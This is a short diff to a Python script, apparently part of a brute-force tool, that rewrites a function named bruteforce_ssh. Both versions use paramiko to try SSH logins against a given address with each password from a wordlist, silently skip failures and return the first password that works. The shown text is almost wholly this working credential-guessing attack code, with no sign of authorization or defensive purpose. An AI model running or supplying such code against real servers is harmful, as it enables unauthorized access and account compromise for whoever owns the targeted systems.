@@ -3,17 +3,13 @@ import ftplib
 
 
 
-def bruteforce_ssh(adress, port, username, wordlist, threads, noi):
-    password_list = open(wordlist,'r').readlines()
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-    for i in range(noi,len(password_list),threads):
-        password = password_list[i].split('\n')[0]
+def bruteforce_ssh(adress, port, username, wordlist):
+    for password in wordlist:
         try:
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             client.connect(hostname=adress, port=port, username=username, password=password)
             return password
-            exit()
         except:
             pass
 
